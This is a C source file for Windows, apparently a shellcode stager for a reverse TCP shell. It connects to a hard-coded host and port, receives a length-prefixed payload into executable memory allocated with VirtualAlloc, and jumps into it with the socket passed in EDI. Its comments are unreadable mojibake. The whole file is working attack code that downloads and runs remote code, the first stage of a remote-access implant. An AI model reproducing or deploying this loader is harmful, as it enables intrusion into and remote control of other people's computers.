/*
	by codeliker @2014.12.08
	github: https://github.com/codeliker
*/

#include <WinSock2.h>
#include <stdio.h>

#pragma comment(lib,"WS2_32.lib")

int main(int argc,char** argv)
{
	//����socket��Դ
	WSADATA wsData;
	if(WSAStartup(MAKEWORD(2,2),&wsData))
	{
		printf("WSAStartp fail.\n");
		return 0;
	}

	//����socket��������
	SOCKET sock = WSASocket(AF_INET,SOCK_STREAM,0,0,0,0);
	SOCKADDR_IN server;
	ZeroMemory(&server,sizeof(SOCKADDR_IN));
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr("192.168.2.110"); //server ip
	server.sin_port = htons(8080); //server port
	if(SOCKET_ERROR == connect(sock,(SOCKADDR*)&server,sizeof(server)))
	{
		printf("connect to server fail.\n");
		goto Fail;
	}

	//���ճ���
	u_int payloadLen;
	if (recv(sock,(char*)&payloadLen,sizeof(payloadLen),0) != sizeof(payloadLen))
	{
		printf("recv error\n");
		goto Fail;
	}

	//����ռ䣬�Խ��������غ�
	char* orig_buffer = (char*)VirtualAlloc(NULL,payloadLen,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	char* buffer = orig_buffer;
	int ret = 0;
	do 
	{
		ret = recv(sock,buffer,payloadLen,0);
		buffer += ret;
		payloadLen -= ret;
	} while (ret > 0 && payloadLen > 0);


	//�����������ִ���غ�
	__asm
	{
		mov edi,sock;   //sock �����edi��
		jmp orig_buffer; //ִ��Ȩת�Ƶ� �غ��У���Ҫָ�������ء������Ҫ�����أ��޸����Ƚϴ󣬲��������ط����ɸ��߳�,�����������˳�ʱExitThread������
	}

	//�ͷſռ�
	VirtualFree(orig_buffer,0,MEM_RELEASE);

Fail:
	closesocket(sock);
	WSACleanup();
	return 0;
}